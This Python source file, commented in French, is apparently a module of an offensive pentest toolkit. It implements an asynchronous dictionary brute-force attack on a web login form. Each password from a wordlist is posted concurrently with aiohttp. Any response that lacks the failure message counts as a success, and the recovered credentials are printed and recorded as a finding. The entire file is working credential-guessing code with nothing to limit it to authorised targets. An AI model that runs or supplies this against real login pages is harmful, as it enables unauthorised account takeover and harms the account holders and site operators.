import asyncio
import aiohttp
from core.reporter import add_finding

async def attempt_login(session, url, username, password, user_field, pass_field, fail_msg, semaphore):
    """Effectue une tentative de connexion unique."""
    data = {
        user_field: username,
        pass_field: password
    }
    
    async with semaphore:
        try:
            async with session.post(url, data=data, timeout=5, allow_redirects=True) as resp:
                content = await resp.text()
                
                # Si le message d'échec n'est PAS dans la réponse, c'est peut-être un succès
                if fail_msg not in content:
                    print(f"\n[\033[92m+\033[0m] SUCCÈS : Mot de passe trouvé : {password}")
                    return password
        except Exception:
            pass
    return None

async def start_brute(url, username, wordlist, user_field, pass_field, fail_msg, threads):
    print(f"[*] Lancement du Brute Force sur {url} (Cible: {username})")
    
    semaphore = asyncio.Semaphore(threads)
    tasks = []
    
    async with aiohttp.ClientSession() as session:
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if not password: continue
                    
                    tasks.append(attempt_login(session, url, username, password, user_field, pass_field, fail_msg, semaphore))
            
            # On attend les résultats
            results = await asyncio.gather(*tasks)
            
            # On cherche si l'un des résultats n'est pas None
            for res in results:
                if res:
                    add_finding("Brute Force Web", url, f"Accès trouvé ! Utilisateur: **{username}** | Password: **{res}**")
                    return
                    
            print("[-] Fin du dictionnaire. Aucun mot de passe trouvé.")
            
        except FileNotFoundError:
            print(f"[-] Erreur : Dictionnaire {wordlist} introuvable.")

def run_brute_custom(args):
    """Wrapper pour arsenal.py"""
    asyncio.run(start_brute(
        args.url, args.user, args.wordlist, 
        args.user_field, args.pass_field, args.fail, args.threads
    ))